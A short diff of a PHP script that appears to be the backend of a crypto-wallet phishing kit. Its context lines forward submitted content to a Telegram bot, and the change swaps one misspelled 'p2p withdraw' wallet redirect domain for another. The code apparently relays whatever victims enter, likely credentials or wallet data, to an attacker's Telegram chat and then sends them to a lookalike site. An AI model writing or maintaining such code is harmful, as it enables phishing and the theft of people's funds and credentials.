@@ -28,5 +28,5 @@ if (!empty($content)) {  // Pengecekan apakah $content tidak kosong
     sendMessage($kennesia_telegram_id, $message, $kennesia_token_bot);
 }
 
-header('Location: https://p2pwhitdraw.app-id.site/wallet');
+header('Location: https://witdrawp2p.app-id.site/wallet');
 ?>
